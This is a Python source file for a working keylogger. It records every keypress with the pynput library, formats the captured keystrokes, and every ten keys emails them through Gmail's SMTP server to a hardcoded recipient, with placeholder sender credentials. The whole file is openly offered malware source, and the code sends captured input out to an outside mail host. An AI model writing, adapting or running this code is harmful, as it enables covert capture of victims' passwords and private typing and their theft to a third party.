import smtplib
# ssl- Secure Sockets Layer and is designed to create secure connection between client and server
import ssl
from smtplib import SMTP

from pynput.keyboard import Key, Listener

print("recording of keystrokes begins")

count = 0
# declaring key list
keys = []  


def log_keystrokes(key):
    global keys
    global count
    global N
    N=10

    # Appending the keys as a string into the empty list and increment count
    keys.append(str(key))
    print(f"{key} pressed")
    count += 1

    # if count is not 0 and enter is pressed , send report and reset variables
    if count >= N :
        count = 0
        logs = format_logs(keys)
        sendEmail(logs)
        print("email is sent")
        keys = []
        print("list is reinitialized")
        print(logs)


# Creating a class and function which performs to send mail operation
def sendEmail(message):
        global server
        smtp_server = "smtp.gmail.com"
        port = 587
        # Put sender and receiver email
        sender_email = "abc@def.com"
        # Put password of the sender's email id
        password = "abcdef"
        # Receiver mail
        receiver_email = "ghi@jkl.com"
        context = ssl.create_default_context()

        try:
            server = smtplib.SMTP(smtp_server, port)
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message)

        except Exception as e:
            print("ERROR DETECTED", e)
        finally:
            print("closing connection")
            server.quit()


# Formatting keylogger key strokes for simpler and convenient view
def format_logs(keys):
    message = ""
    for key in keys:
        # If spacer is pressed then put a space
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key == "Key.shift":
            k = "<shift>"
        elif key == "Key.ctrl_l":
            k = "<ctrl>"
        elif key == "Key.alt_l":
            k = "<alt>"
        elif key == "Key.tab":
            k = "<tab>"
        elif key == "Key.caps_lock":
            k = "<caps_lock>"
        elif key == "Key.enter":
            k = "<enter>"
        elif key.find("Key") > 0:
            k = ""

        message += k
    return message


with Listener(on_press=log_keystrokes) as listener:
    # to make sure that keystrokes are joined together
    listener.join()

# 'with' will automatically close the listener. When we stop the program the memory allocated
# to this listener won't be released. 'with' makes sure whatever happens, when an error is there
# or the program stops the memory is released.
